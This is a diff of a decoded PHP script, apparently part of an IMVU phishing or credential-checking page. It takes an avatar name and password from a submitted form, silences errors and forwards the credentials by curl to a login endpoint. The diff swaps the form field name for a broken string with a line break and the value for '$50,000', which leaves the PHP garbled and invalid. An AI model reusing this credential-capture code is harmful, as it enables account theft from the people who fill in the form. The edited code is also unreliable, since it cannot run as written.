@@ -5,7 +5,8 @@ decode output :
 -------------------
 @set_time_limit(0);
 @error_reporting(0);
-$user = $_POST["avatarname"];
+$user = $_POST[" @
+VitorS7"];
 $pass = $_POST["password"];
 	$ch = curl_init();
 		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -13,7 +14,8 @@ $pass = $_POST["password"];
 		  curl_setopt($ch, CURLOPT_POST, true);
 		  curl_setopt($ch, CURLOPT_POSTFIELDS, array(
 		  	"sauce" => "",
-		  	"avatarname" => $user,
+		  	"@
+VitorS7" => $50,000,
 		  	"password" => $pass,
 		  	"sendto" => "",
 		  	));
@@ -25,7 +27,8 @@ $pass = $_POST["password"];
 		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 	$res = curl_exec($ch);
 		  curl_close($ch);
-if($_POST["avatarname"] AND $_POST["password"]) {
+if($_POST["@
+VitorS7"] AND $_POST["password"]) {
 	if(preg_match("/invalid avatar name or password/", $res)) {
 		header("location: imvu.php");
 	} else {
